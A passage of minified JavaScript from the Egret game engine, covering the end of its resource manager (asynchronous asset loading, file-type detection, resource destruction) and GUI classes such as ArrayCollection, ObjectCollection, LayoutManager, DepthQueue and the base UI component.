			if ("" == e && (f = d.AnalyzerBase.getStringPrefix(b), e = this.resConfig.getType(f), "" == e)) {
				a.call(c, null);
				return
			}
			(e = this.getAnalyzerByType(e).getRes(b)) ? a.call(c, e) : (b = {
					key : b,
					compFunc : a,
					thisObject : c
				}, this.asyncDic[f] ?
				this.asyncDic[f].push(b) : (this.asyncDic[f] = [b], f = this.resConfig.getResourceItem(f), this.resLoader.loadItem(f)))
		};
		a.prototype.getResByUrl = function (b, a, c, e) {
			"undefined" === typeof e && (e = "");
			if (b) {
				e || (e = this.getTypeByUrl(b));
				var f = this.getAnalyzerByType(e).getRes(b);
				f ? a.call(c, f) : (a = {
						key : b,
						compFunc : a,
						thisObject : c
					}, this.asyncDic[b] ? this.asyncDic[b].push(a) : (this.asyncDic[b] = [a], b = new d.ResourceItem(b, b, e), this.resLoader.loadItem(b)))
			} else
				a.call(c, null)
		};
		a.prototype.getTypeByUrl = function (b) {
			(b = b.substr(b.lastIndexOf(".") +
						1)) && (b = b.toLowerCase());
			switch (b) {
			case d.ResourceItem.TYPE_XML:
			case d.ResourceItem.TYPE_JSON:
			case d.ResourceItem.TYPE_SHEET:
				break;
			case "png":
			case "jpg":
			case "gif":
				b = d.ResourceItem.TYPE_IMAGE;
				break;
			case "fnt":
				b = d.ResourceItem.TYPE_FONT;
				break;
			case "txt":
				b = d.ResourceItem.TYPE_TEXT;
				break;
			case "mp3":
			case "ogg":
			case "mpeg":
			case "wav":
			case "m4a":
			case "mp4":
			case "aiff":
			case "wma":
			case "mid":
				b = d.ResourceItem.TYPE_SOUND;
				break;
			default:
				b = d.ResourceItem.TYPE_BIN
			}
			return b
		};
		a.prototype.onResourceItemComp = function (b) {
			var a =
				this.asyncDic[b.name];
			delete this.asyncDic[b.name];
			b = this.getAnalyzerByType(b.type);
			for (var c = a.length, d = 0; d < c; d++) {
				var e = a[d],
				f = b.getRes(e.key);
				e.compFunc.call(e.thisObject, f)
			}
		};
		a.prototype.destroyRes = function (b) {
			var a = this.resConfig.getRawGroupByName(b);
			if (a) {
				var c = this.loadedGroups.indexOf(b);
				-1 != c && this.loadedGroups.splice(c, 1);
				b = a.length;
				for (var d = 0; d < b; d++) {
					c = a[d];
					c.loaded = !1;
					var e = this.getAnalyzerByType(c.type);
					e.destroyRes(c.name)
				}
				return !0
			}
			a = this.resConfig.getType(b);
			if ("" == a)
				return !1;
			c = this.resConfig.getRawResourceItem(b);
			c.loaded = !1;
			e = this.getAnalyzerByType(a);
			return e.destroyRes(b)
		};
		a.prototype.setMaxLoadingThread = function (b) {
			1 > b && (b = 1);
			this.resLoader.thread = b
		};
		a.GROUP_CONFIG = "RES__CONFIG";
		return a
	}
	(egret.EventDispatcher);
	e.prototype.__class__ = "Resource";
	var f = new e
})(RES || (RES = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a(b) {
				"undefined" === typeof b && (b = null);
				c.call(this);
				this._source = b ? b : []
			}
			__extends(a, c);
			Object.defineProperty(a.prototype, "source", {
				get : function () {
					return this._source
				},
				set : function (b) {
					b || (b = []);
					this._source = b;
					this.dispatchCoEvent(e.CollectionEventKind.RESET)
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.refresh = function () {
				this.dispatchCoEvent(e.CollectionEventKind.REFRESH)
			};
			a.prototype.contains = function (b) {
				return -1 != this.getItemIndex(b)
			};
			a.prototype.checkIndex =
			function (b) {
				if (0 > b || b >= this._source.length)
					throw new RangeError('\u7d22\u5f15:"' + b + '"\u8d85\u51fa\u96c6\u5408\u5143\u7d20\u7d22\u5f15\u8303\u56f4');
			};
			Object.defineProperty(a.prototype, "length", {
				get : function () {
					return this._source.length
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.addItem = function (b) {
				this._source.push(b);
				this.dispatchCoEvent(e.CollectionEventKind.ADD, this._source.length - 1, -1, [b])
			};
			a.prototype.addItemAt = function (b, a) {
				if (0 > a || a > this._source.length)
					throw new RangeError('\u7d22\u5f15:"' +
						a + '"\u8d85\u51fa\u96c6\u5408\u5143\u7d20\u7d22\u5f15\u8303\u56f4');
				this._source.splice(a, 0, b);
				this.dispatchCoEvent(e.CollectionEventKind.ADD, a, -1, [b])
			};
			a.prototype.getItemAt = function (b) {
				return this._source[b]
			};
			a.prototype.getItemIndex = function (b) {
				for (var a = this._source.length, c = 0; c < a; c++)
					if (this._source[c] === b)
						return c;
				return -1
			};
			a.prototype.itemUpdated = function (b) {
				var a = this.getItemIndex(b);
				-1 != a && this.dispatchCoEvent(e.CollectionEventKind.UPDATE, a, -1, [b])
			};
			a.prototype.removeAll = function () {
				var b =
					this._source.concat();
				this._source.length = 0;
				this.dispatchCoEvent(e.CollectionEventKind.REMOVE, 0, -1, b)
			};
			a.prototype.removeItemAt = function (b) {
				this.checkIndex(b);
				var a = this._source.splice(b, 1)[0];
				this.dispatchCoEvent(e.CollectionEventKind.REMOVE, b, -1, [a]);
				return a
			};
			a.prototype.replaceItemAt = function (b, a) {
				this.checkIndex(a);
				var c = this._source.splice(a, 1, b)[0];
				this.dispatchCoEvent(e.CollectionEventKind.REPLACE, a, -1, [b], [c]);
				return c
			};
			a.prototype.replaceAll = function (b) {
				b || (b = []);
				for (var a = b.length, c = this._source.length,
					d = a; d < c; d++)
					this.removeItemAt(a);
				for (d = 0; d < a; d++)
					d >= c ? this.addItemAt(b[d], d) : this.replaceItemAt(b[d], d);
				this._source = b
			};
			a.prototype.moveItemAt = function (b, a) {
				this.checkIndex(b);
				this.checkIndex(a);
				var c = this._source.splice(b, 1)[0];
				this._source.splice(a, 0, c);
				this.dispatchCoEvent(e.CollectionEventKind.MOVE, a, b, [c]);
				return c
			};
			a.prototype.dispatchCoEvent = function (b, a, c, d, f) {
				"undefined" === typeof b && (b = null);
				"undefined" === typeof a && (a = -1);
				"undefined" === typeof c && (c = -1);
				"undefined" === typeof d && (d = null);
				"undefined" ===
				typeof f && (f = null);
				e.CollectionEvent.dispatchCollectionEvent(this, e.CollectionEvent.COLLECTION_CHANGE, b, a, c, d, f)
			};
			return a
		}
		(d.EventDispatcher);
		e.ArrayCollection = f;
		f.prototype.__class__ = "egret.gui.ArrayCollection"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a(b, a) {
				"undefined" === typeof b && (b = "children");
				"undefined" === typeof a && (a = "parent");
				c.call(this);
				this.nodeList = [];
				this._openNodes = [];
				this._showRoot = !1;
				this.childrenKey = b;
				this.parentKey = a
			}
			__extends(a, c);
			Object.defineProperty(a.prototype, "source", {
				get : function () {
					return this._source
				},
				set : function (b) {
					this._source = b;
					this._openNodes = [];
					this.nodeList = [];
					this._source && (this._showRoot ? this.nodeList.push(this._source) : (this._openNodes = [this._source], this.addChildren(this._source,
								this.nodeList)));
					this.dispatchCoEvent(e.CollectionEventKind.RESET)
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "openNodes", {
				get : function () {
					return this._openNodes.concat()
				},
				set : function (b) {
					this._openNodes = b ? b.concat() : [];
					this.refresh()
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "length", {
				get : function () {
					return this.nodeList.length
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.getItemAt = function (b) {
				return this.nodeList[b]
			};
			a.prototype.getItemIndex = function (b) {
				for (var a =
						this.nodeList.length, c = 0; c < a; c++)
					if (this.nodeList[c] === b)
						return c;
				return -1
			};
			a.prototype.itemUpdated = function (b) {
				var a = this.getItemIndex(b);
				-1 != a && this.dispatchCoEvent(e.CollectionEventKind.UPDATE, a, -1, [b])
			};
			a.prototype.removeItem = function (b) {
				this.isItemOpen(b) && this.closeNode(b);
				if (b) {
					var a = b[this.parentKey];
					if (a && (a = a[this.childrenKey])) {
						var c = a.indexOf(b);
						-1 != c && a.splice(c, 1);
						b[this.parentKey] = null;
						c = this.nodeList.indexOf(b);
						-1 != c && (this.nodeList.splice(c, 1), this.dispatchCoEvent(e.CollectionEventKind.REMOVE,
								c, -1, [b]))
					}
				}
			};
			Object.defineProperty(a.prototype, "showRoot", {
				get : function () {
					return this._showRoot
				},
				set : function (b) {
					this._showRoot != b && (this._showRoot = b, this._source && (this._showRoot ? this.nodeList.splice(0, 0, this._source) : (this.nodeList.shift(), -1 == this.openNodes.indexOf(this._source) && this.openNodes.push(this._source)), this.refresh()))
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.addChildren = function (b, a) {
				if (b.hasOwnProperty(this.childrenKey) && -1 != this._openNodes.indexOf(b))
					for (var c = b[this.childrenKey],
						d = c.length, e = 0; e < d; e++) {
						var f = c[e];
						a.push(f);
						this.addChildren(f, a)
					}
			};
			a.prototype.hasChildren = function (b) {
				return b.hasOwnProperty(this.childrenKey) ? 0 < b[this.childrenKey].length : !1
			};
			a.prototype.isItemOpen = function (b) {
				return -1 != this._openNodes.indexOf(b)
			};
			a.prototype.expandItem = function (b, a) {
				"undefined" === typeof a && (a = !0);
				a ? this.openNode(b) : this.closeNode(b)
			};
			a.prototype.openNode = function (b) {
				if (-1 == this._openNodes.indexOf(b)) {
					this._openNodes.push(b);
					var a = this.nodeList.indexOf(b);
					if (-1 != a) {
						var c = [];
						this.addChildren(b, c);
						for (var d = a; c.length; ) {
							d++;
							var f = c.shift();
							this.nodeList.splice(d, 0, f);
							this.dispatchCoEvent(e.CollectionEventKind.ADD, d, -1, [f])
						}
						this.dispatchCoEvent("open", a, a, [b])
					}
				}
			};
			a.prototype.closeNode = function (b) {
				var a = this._openNodes.indexOf(b);
				if (-1 != a) {
					var c = [];
					this.addChildren(b, c);
					this._openNodes.splice(a, 1);
					a = this.nodeList.indexOf(b);
					if (-1 != a) {
						for (a++; c.length; ) {
							var d = this.nodeList.splice(a, 1)[0];
							this.dispatchCoEvent(e.CollectionEventKind.REMOVE, a, -1, [d]);
							c.shift()
						}
						a--;
						this.dispatchCoEvent(e.CollectionEventKind.CLOSE,
							a, a, [b])
					}
				}
			};
			a.prototype.getDepth = function (b) {
				var a = 0;
				for (b = b[this.parentKey]; b; )
					a++, b = b[this.parentKey];
				0 < a && !this._showRoot && a--;
				return a
			};
			a.prototype.refresh = function () {
				this.nodeList = [];
				this._source && (this._showRoot && this.nodeList.push(this._source), this.addChildren(this._source, this.nodeList));
				this.dispatchCoEvent(e.CollectionEventKind.REFRESH)
			};
			a.prototype.dispatchCoEvent = function (b, a, c, d, f) {
				"undefined" === typeof b && (b = null);
				"undefined" === typeof a && (a = -1);
				"undefined" === typeof c && (c = -1);
				"undefined" ===
				typeof d && (d = null);
				"undefined" === typeof f && (f = null);
				e.CollectionEvent.dispatchCollectionEvent(this, e.CollectionEvent.COLLECTION_CHANGE, b, a, c, d, f)
			};
			a.assignParent = function (b, c, d) {
				"undefined" === typeof c && (c = "children");
				"undefined" === typeof d && (d = "parent");
				if (b.hasOwnProperty(c))
					for (var e = b[c], f = e.length, g = 0; g < f; g++) {
						var l = e[g];
						try {
							l[d] = b
						} catch (k) {}

						a.assignParent(l, c, d)
					}
			};
			return a
		}
		(d.EventDispatcher);
		e.ObjectCollection = f;
		f.prototype.__class__ = "egret.gui.ObjectCollection"
	})(d.gui || (d.gui = {}))
})(egret ||
	(egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this.targetLevel = Number.MAX_VALUE;
				this.updateCompleteQueue = new e.DepthQueue;
				this.invalidateClientPropertiesFlag = this.invalidatePropertiesFlag = !1;
				this.invalidatePropertiesQueue = new e.DepthQueue;
				this.invalidateClientSizeFlag = this.invalidateSizeFlag = !1;
				this.invalidateSizeQueue = new e.DepthQueue;
				this.invalidateDisplayListFlag = !1;
				this.invalidateDisplayListQueue = new e.DepthQueue;
				this.listenersAttached = !1
			}
			__extends(a, c);
			a.prototype.invalidateProperties =
			function (b) {
				this.invalidatePropertiesFlag || (this.invalidatePropertiesFlag = !0, this.listenersAttached || this.attachListeners());
				this.targetLevel <= b.nestLevel && (this.invalidateClientPropertiesFlag = !0);
				this.invalidatePropertiesQueue.insert(b)
			};
			a.prototype.validateProperties = function () {
				for (var b = this.invalidatePropertiesQueue.shift(); b; )
					b.parent && (b.validateProperties(), b.updateCompletePendingFlag || (this.updateCompleteQueue.insert(b), b.updateCompletePendingFlag = !0)), b = this.invalidatePropertiesQueue.shift();
				this.invalidatePropertiesQueue.isEmpty() && (this.invalidatePropertiesFlag = !1)
			};
			a.prototype.invalidateSize = function (b) {
				this.invalidateSizeFlag || (this.invalidateSizeFlag = !0, this.listenersAttached || this.attachListeners());
				this.targetLevel <= b.nestLevel && (this.invalidateClientSizeFlag = !0);
				this.invalidateSizeQueue.insert(b)
			};
			a.prototype.validateSize = function () {
				for (var b = this.invalidateSizeQueue.pop(); b; )
					b.parent && (b.validateSize(), b.updateCompletePendingFlag || (this.updateCompleteQueue.insert(b), b.updateCompletePendingFlag =
								!0)), b = this.invalidateSizeQueue.pop();
				this.invalidateSizeQueue.isEmpty() && (this.invalidateSizeFlag = !1)
			};
			a.prototype.invalidateDisplayList = function (b) {
				this.invalidateDisplayListFlag || (this.invalidateDisplayListFlag = !0, this.listenersAttached || this.attachListeners());
				this.invalidateDisplayListQueue.insert(b)
			};
			a.prototype.validateDisplayList = function () {
				for (var b = this.invalidateDisplayListQueue.shift(); b; )
					b.parent && (b.validateDisplayList(), b.updateCompletePendingFlag || (this.updateCompleteQueue.insert(b),
							b.updateCompletePendingFlag = !0)), b = this.invalidateDisplayListQueue.shift();
				this.invalidateDisplayListQueue.isEmpty() && (this.invalidateDisplayListFlag = !1)
			};
			a.prototype.attachListeners = function () {
				e.UIGlobals.stage.addEventListener(d.Event.ENTER_FRAME, this.doPhasedInstantiationCallBack, this);
				e.UIGlobals.stage.addEventListener(d.Event.RENDER, this.doPhasedInstantiationCallBack, this);
				e.UIGlobals.stage.invalidate();
				this.listenersAttached = !0
			};
			a.prototype.doPhasedInstantiationCallBack = function (b) {
				e.UIGlobals.stage.removeEventListener(d.Event.ENTER_FRAME,
					this.doPhasedInstantiationCallBack, this);
				e.UIGlobals.stage.removeEventListener(d.Event.RENDER, this.doPhasedInstantiationCallBack, this);
				this.doPhasedInstantiation()
			};
			a.prototype.doPhasedInstantiation = function () {
				this.invalidatePropertiesFlag && this.validateProperties();
				this.invalidateSizeFlag && this.validateSize();
				this.invalidateDisplayListFlag && this.validateDisplayList();
				if (this.invalidatePropertiesFlag || this.invalidateSizeFlag || this.invalidateDisplayListFlag)
					this.attachListeners();
				else {
					this.listenersAttached =
						!1;
					for (var b = this.updateCompleteQueue.pop(); b; )
						b.initialized || (b.initialized = !0), b.hasEventListener(e.UIEvent.UPDATE_COMPLETE) && e.UIEvent.dispatchUIEvent(b, e.UIEvent.UPDATE_COMPLETE), b.updateCompletePendingFlag = !1, b = this.updateCompleteQueue.pop();
					e.UIEvent.dispatchUIEvent(this, e.UIEvent.UPDATE_COMPLETE)
				}
			};
			a.prototype.validateNow = function () {
				for (var b = 0; this.listenersAttached && 100 > b++; )
					this.doPhasedInstantiationCallBack()
			};
			a.prototype.validateClient = function (b, a) {
				"undefined" === typeof a && (a = !1);
				var c,
				d = !1,
				f = this.targetLevel;
				this.targetLevel == Number.MAX_VALUE && (this.targetLevel = b.nestLevel);
				for (; !d; ) {
					d = !0;
					for (c = this.invalidatePropertiesQueue.removeSmallestChild(b); c; )
						c.parent && (c.validateProperties(), c.updateCompletePendingFlag || (this.updateCompleteQueue.insert(c), c.updateCompletePendingFlag = !0)), c = this.invalidatePropertiesQueue.removeSmallestChild(b);
					this.invalidatePropertiesQueue.isEmpty() && (this.invalidatePropertiesFlag = !1);
					this.invalidateClientPropertiesFlag = !1;
					for (c = this.invalidateSizeQueue.removeLargestChild(b); c; ) {
						c.parent &&
						(c.validateSize(), c.updateCompletePendingFlag || (this.updateCompleteQueue.insert(c), c.updateCompletePendingFlag = !0));
						if (this.invalidateClientPropertiesFlag && (c = this.invalidatePropertiesQueue.removeSmallestChild(b))) {
							this.invalidatePropertiesQueue.insert(c);
							d = !1;
							break
						}
						c = this.invalidateSizeQueue.removeLargestChild(b)
					}
					this.invalidateSizeQueue.isEmpty() && (this.invalidateSizeFlag = !1);
					this.invalidateClientSizeFlag = this.invalidateClientPropertiesFlag = !1;
					if (!a) {
						for (c = this.invalidateDisplayListQueue.removeSmallestChild(b); c; ) {
							c.parent &&
							(c.validateDisplayList(), c.updateCompletePendingFlag || (this.updateCompleteQueue.insert(c), c.updateCompletePendingFlag = !0));
							if (this.invalidateClientPropertiesFlag && (c = this.invalidatePropertiesQueue.removeSmallestChild(b))) {
								this.invalidatePropertiesQueue.insert(c);
								d = !1;
								break
							}
							if (this.invalidateClientSizeFlag && (c = this.invalidateSizeQueue.removeLargestChild(b))) {
								this.invalidateSizeQueue.insert(c);
								d = !1;
								break
							}
							c = this.invalidateDisplayListQueue.removeSmallestChild(b)
						}
						this.invalidateDisplayListQueue.isEmpty() &&
						(this.invalidateDisplayListFlag = !1)
					}
				}
				if (f == Number.MAX_VALUE && (this.targetLevel = Number.MAX_VALUE, !a))
					for (c = this.updateCompleteQueue.removeLargestChild(b); c; )
						c.initialized || (c.initialized = !0), c.hasEventListener(e.UIEvent.UPDATE_COMPLETE) && e.UIEvent.dispatchUIEvent(c, e.UIEvent.UPDATE_COMPLETE), c.updateCompletePendingFlag = !1, c = this.updateCompleteQueue.removeLargestChild(b)
			};
			return a
		}
		(d.EventDispatcher);
		e.LayoutManager = f;
		f.prototype.__class__ = "egret.gui.LayoutManager"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
(function (d) {
	(function (e) {
		var f = function () {
			function a() {
				this.depthBins = [];
				this.minDepth = 0;
				this.maxDepth = -1
			}
			a.prototype.insert = function (b) {
				var a = b.nestLevel,
				d = b.hashCode;
				this.maxDepth < this.minDepth ? this.minDepth = this.maxDepth = a : (a < this.minDepth && (this.minDepth = a), a > this.maxDepth && (this.maxDepth = a));
				var e = this.depthBins[a];
				e ? null == e.items[d] && (e.items[d] = b, e.length++) : (e = new c, this.depthBins[a] = e, e.items[d] = b, e.length++)
			};
			a.prototype.pop = function () {
				var b = null;
				if (this.minDepth <= this.maxDepth) {
					for (var a = this.depthBins[this.maxDepth]; !a ||
						0 == a.length; ) {
						this.maxDepth--;
						if (this.maxDepth < this.minDepth)
							return null;
						a = this.depthBins[this.maxDepth]
					}
					var c = a.items,
					d;
					for (d in c) {
						b = c[d];
						this.remove(b, this.maxDepth);
						break
					}
					for (; !a || 0 == a.length; ) {
						this.maxDepth--;
						if (this.maxDepth < this.minDepth)
							break;
						a = this.depthBins[this.maxDepth]
					}
				}
				return b
			};
			a.prototype.shift = function () {
				var b = null;
				if (this.minDepth <= this.maxDepth) {
					for (var a = this.depthBins[this.minDepth]; !a || 0 == a.length; ) {
						this.minDepth++;
						if (this.minDepth > this.maxDepth)
							return null;
						a = this.depthBins[this.minDepth]
					}
					var c =
						a.items,
					d;
					for (d in c) {
						b = c[d];
						this.remove(b, this.minDepth);
						break
					}
					for (; !a || 0 == a.length; ) {
						this.minDepth++;
						if (this.minDepth > this.maxDepth)
							break;
						a = this.depthBins[this.minDepth]
					}
				}
				return b
			};
			a.prototype.removeLargestChild = function (b) {
				for (var a = this.maxDepth, c = b.nestLevel, e = b.hashCode; c <= a; ) {
					var f = this.depthBins[a];
					if (f && 0 < f.length) {
						if (a == b.nestLevel) {
							if (f.items[e])
								return this.remove(b, a), b
						} else {
							var f = f.items,
							g;
							for (g in f) {
								var l = f[g];
								if (l instanceof d.DisplayObject && b instanceof d.DisplayObjectContainer &&
									b.contains(l))
									return this.remove(l, a), l
							}
						}
						a--
					} else if (a == this.maxDepth && this.maxDepth--, a--, a < c)
						break
				}
				return null
			};
			a.prototype.removeSmallestChild = function (b) {
				for (var a = b.nestLevel, c = b.hashCode; a <= this.maxDepth; ) {
					var e = this.depthBins[a];
					if (e && 0 < e.length) {
						if (a == b.nestLevel) {
							if (e.items[c])
								return this.remove(b, a), b
						} else {
							var e = e.items,
							f;
							for (f in e) {
								var g = e[f];
								if (g instanceof d.DisplayObject && b instanceof d.DisplayObjectContainer && b.contains(g))
									return this.remove(g, a), g
							}
						}
						a++
					} else if (a == this.minDepth && this.minDepth++,
						a++, a > this.maxDepth)
						break
				}
				return null
			};
			a.prototype.remove = function (b, a) {
				"undefined" === typeof a && (a = -1);
				var c = b.hashCode,
				d = this.depthBins[0 <= a ? a : b.nestLevel];
				return d && null != d.items[c] ? (delete d.items[c], d.length--, b) : null
			};
			a.prototype.removeAll = function () {
				this.minDepth = this.depthBins.length = 0;
				this.maxDepth = -1
			};
			a.prototype.isEmpty = function () {
				return this.minDepth > this.maxDepth
			};
			return a
		}
		();
		e.DepthQueue = f;
		f.prototype.__class__ = "egret.gui.DepthQueue";
		var c = function () {
			return function () {
				this.length = 0;
				this.items =
					[]
			}
		}
		();
		e.DepthBin = c;
		c.prototype.__class__ = "egret.gui.DepthBin"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
(function (d) {
	(function (d) {
		var f = function () {
			function c() {}

			Object.defineProperty(c, "stage", {
				get : function () {
					return c._stage
				},
				enumerable : !0,
				configurable : !0
			});
			c._initlize = function (a) {
				c.initlized || (c._stage = a, c._layoutManager = new d.LayoutManager, c.initlized = !0)
			};
			Object.defineProperty(c, "uiStage", {
				get : function () {
					return c._uiStage
				},
				enumerable : !0,
				configurable : !0
			});
			c.initlized = !1;
			return c
		}
		();
		d.UIGlobals = f;
		f.prototype.__class__ = "egret.gui.UIGlobals"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this.initializeCalled = this._initialized = this._updateCompletePendingFlag = !1;
				this._nestLevel = 0;
				this._enabled = !0;
				this._minWidth = this._height = this._width = 0;
				this._maxWidth = 1E4;
				this._minHeight = 0;
				this._maxHeight = 1E4;
				this._measuredHeight = this._measuredWidth = 0;
				this._validateNowFlag = this._invalidateDisplayListFlag = this._invalidateSizeFlag = this._invalidatePropertiesFlag = !1;
				this._includeInLayout = !0;
				this._layoutHeightExplicitlySet = this._layoutWidthExplicitlySet =
					!1;
				this.touchEnabled = !0;
				this.addEventListener(d.Event.ADDED_TO_STAGE, this.onAddedToStage, this);
				this.addEventListener(d.Event.ADDED_TO_STAGE, this.checkInvalidateFlag, this)
			}
			__extends(a, c);
			a.prototype.onAddedToStage = function (b) {
				this.removeEventListener(d.Event.ADDED_TO_STAGE, this.onAddedToStage, this);
				this._initialize();
				e.UIGlobals._initlize(this.stage);
				0 < this._nestLevel && this.checkInvalidateFlag()
			};
			Object.defineProperty(a.prototype, "id", {
				get : function () {
					return this._id
				},
				set : function (b) {
					this._id = b
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "isPopUp", {
				get : function () {
					return this._isPopUp
				},
				set : function (b) {
					this._isPopUp = b
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "owner", {
				get : function () {
					return this._owner ? this._owner : this.parent
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.ownerChanged = function (b) {
				this._owner = b
			};
			Object.defineProperty(a.prototype, "updateCompletePendingFlag", {
				get : function () {
					return this._updateCompletePendingFlag
				},
				set : function (b) {
					this._updateCompletePendingFlag =
						b
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "initialized", {
				get : function () {
					return this._initialized
				},
				set : function (b) {
					this._initialized != b && (this._initialized = b) && e.UIEvent.dispatchUIEvent(this, e.UIEvent.CREATION_COMPLETE)
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._initialize = function () {
				this.initializeCalled || (e.UIGlobals.stage && this.removeEventListener(d.Event.ADDED_TO_STAGE, this.onAddedToStage, this), this.initializeCalled = !0, e.UIEvent.dispatchUIEvent(this, e.UIEvent.INITIALIZE),
					this.createChildren(), this.childrenCreated())
			};
			a.prototype.createChildren = function () {};
			a.prototype.childrenCreated = function () {
				this.invalidateProperties();
				this.invalidateSize();
				this.invalidateDisplayList()
			};
			Object.defineProperty(a.prototype, "nestLevel", {
				get : function () {
					return this._nestLevel
				},
				set : function (b) {
					if (this._nestLevel != b)
						for (this._nestLevel = b, 0 == this._nestLevel ? this.addEventListener(d.Event.ADDED_TO_STAGE, this.checkInvalidateFlag, this) : this.removeEventListener(d.Event.ADDED_TO_STAGE, this.checkInvalidateFlag,
								this), b = this.numChildren - 1; 0 <= b; b--) {
							var a = this.getChildAt(b);
							null != a && (a.nestLevel = this._nestLevel + 1)
						}
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._addToDisplayList = function (b, a) {
				"undefined" === typeof a && (a = !0);
				var c = this.numChildren;
				b.parent == this && c--;
				this._addingChild(b);
				this._doAddChild(b, c, a);
				this._childAdded(b);
				return b
			};
			a.prototype._addToDisplayListAt = function (b, a, c) {
				"undefined" === typeof c && (c = !0);
				this._addingChild(b);
				this._doAddChild(b, a, c);
				this._childAdded(b);
				return b
			};
			a.prototype._removeFromDisplayList =
			function (b, a) {
				"undefined" === typeof a && (a = !0);
				var c = this._children.indexOf(b);
				if (0 <= c)
					return this._doRemoveChild(c, a), this._childRemoved(b), b;
				d.Logger.fatal("child\u672a\u88abaddChild\u5230\u8be5parent");
				return null
			};
			a.prototype._removeFromDisplayListAt = function (b, a) {
				"undefined" === typeof a && (a = !0);
				if (0 <= b && b < this._children.length) {
					var c = this._doRemoveChild(b, a);
					this._childRemoved(c);
					return c
				}
				d.Logger.fatal("\u63d0\u4f9b\u7684\u7d22\u5f15\u8d85\u51fa\u8303\u56f4");
				return null
			};
			a.prototype.addChild =
			function (b) {
				this._addingChild(b);
				c.prototype.addChild.call(this, b);
				this._childAdded(b);
				return b
			};
			a.prototype.addChildAt = function (b, a) {
				this._addingChild(b);
				c.prototype.addChildAt.call(this, b, a);
				this._childAdded(b);
				return b
			};
			a.prototype._addingChild = function (b) {
				b && "nestLevel" in b && (b.nestLevel = this._nestLevel + 1)
			};
			a.prototype._childAdded = function (b) {
				b instanceof a && (b._initialize(), b.checkInvalidateFlag())
			};
			a.prototype.removeChild = function (b) {
				c.prototype.removeChild.call(this, b);
				this._childRemoved(b);
				return b
			};
			a.prototype.removeChildAt = function (b) {
				b = c.prototype.removeChildAt.call(this, b);
				this._childRemoved(b);
				return b
			};
			a.prototype._childRemoved = function (b) {
				b && "nestLevel" in b && (b.nestLevel = 0)
			};
			a.prototype.checkInvalidateFlag = function (b) {
				e.UIGlobals._layoutManager && (this._invalidatePropertiesFlag && e.UIGlobals._layoutManager.invalidateProperties(this), this._invalidateSizeFlag && e.UIGlobals._layoutManager.invalidateSize(this), this._invalidateDisplayListFlag && e.UIGlobals._layoutManager.invalidateDisplayList(this),
					this._validateNowFlag && (e.UIGlobals._layoutManager.validateClient(this), this._validateNowFlag = !1))
			};
			Object.defineProperty(a.prototype, "enabled", {
				get : function () {
					return this._enabled
				},
				set : function (b) {
					this._enabled = b
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._setWidth = function (b) {
				if (this._width != b || this._explicitWidth != b)
					c.prototype._setWidth.call(this, b), isNaN(b) ? this.invalidateSize() : this._width = b, this.invalidateProperties(), this.invalidateDisplayList(), this.invalidateParentSizeAndDisplayList()
			};
			Object.defineProperty(a.prototype, "width", {
				get : function () {
					return this._width
				},
				set : function (b) {
					this._setWidth(b)
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._setHeight = function (b) {
				if (this._height != b || this._explicitHeight != b)
					c.prototype._setHeight.call(this, b), isNaN(b) ? this.invalidateSize() : this._height = b, this.invalidateProperties(), this.invalidateDisplayList(), this.invalidateParentSizeAndDisplayList()
			};
			Object.defineProperty(a.prototype, "height", {
				get : function () {
					return this._height
				},
				set : function (b) {
					this._setHeight(b)
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "scaleX", {
				get : function () {
					return this._scaleX
				},
				set : function (b) {
					this._setScaleX(b)
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._setScaleX = function (b) {
				this._scaleX != b && (this._scaleX = b, this.invalidateParentSizeAndDisplayList())
			};
			Object.defineProperty(a.prototype, "scaleY", {
				get : function () {
					return this._scaleY
				},
				set : function (b) {
					this._setScaleY(b)
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._setScaleY = function (b) {
				this._scaleY != b && (this._scaleY =
						b, this.invalidateParentSizeAndDisplayList())
			};
			Object.defineProperty(a.prototype, "minWidth", {
				get : function () {
					return this._minWidth
				},
				set : function (b) {
					this._minWidth != b && (this._minWidth = b, this.invalidateSize())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "maxWidth", {
				get : function () {
					return this._maxWidth
				},
				set : function (b) {
					this._maxWidth != b && (this._maxWidth = b, this.invalidateSize())
				},
				enumerable : !0,
				configurable : !0
			});
